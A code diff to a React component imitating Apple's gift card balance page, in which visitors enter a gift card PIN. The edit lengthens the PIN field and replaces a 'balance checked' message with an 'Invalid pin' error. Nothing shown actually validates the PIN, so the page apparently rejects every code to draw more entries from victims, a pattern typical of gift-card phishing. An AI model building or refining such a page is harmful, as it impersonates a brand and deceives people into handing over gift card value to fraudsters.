@@ -166,13 +166,13 @@ export default function AppleGiftCard() {
           value={pin}
           onChange={e => setPin(e.target.value)}
           placeholder="Gift Card PIN"
-          maxLength={16}
+          maxLength={20}
           className="w-full border border-[#d2d2d7] rounded-full px-8 py-4 text-[15px] text-[#1d1d1f] placeholder-[#6e6e73] outline-none focus:border-[#0071e3] focus:ring-2 focus:ring-[#0071e3]/20 transition-all mb-2"
         />
          <div className="gap-4 mb-8">
         <p className="text-[13px] text-center text-[#6e6e73] my-4">
           Can't find your PIN?{" "}
-          <a href="#" className="text-[#0071e3] hover:underline">Learn more</a>
+          <a href="/" className="text-[#0071e3] hover:underline">Learn more</a>
         </p>
         </div>
 
@@ -186,8 +186,8 @@ export default function AppleGiftCard() {
         </div>
 
         {checked && (
-          <div className="mt-4 p-4 bg-green-50 border border-green-200 rounded-xl text-green-700 text-[14px] font-medium">
-            ✓ Balance checked for PIN ending in {pin.slice(-4)}. Please sign in to view your balance.
+          <div className="mt-4 p-4 bg-green-50 border border-green-200 rounded-xl text-red-500 text-[14px] font-medium">
+            Invalid pin. {pin.slice(-4)}. Please input the correct pin.
           </div>
         )}
       </section>
@@ -317,7 +317,7 @@ export default function AppleGiftCard() {
       {/* ── Older gift card ── */}
       <section className="max-w-md mx-auto px-6 py-8 text-center">
         <p className="text-[15px] font-semibold text-[#1d1d1f] mb-1">Have an older giftcard?</p>
-        <a href="#" className="text-[14px] text-[#0071e3] hover:underline">Learn more</a>
+        <a href="/" className="text-[14px] text-[#0071e3] hover:underline">Learn more</a>
 
         {/* Old card images */}
         <div className="flex justify-center gap-4 mt-6">
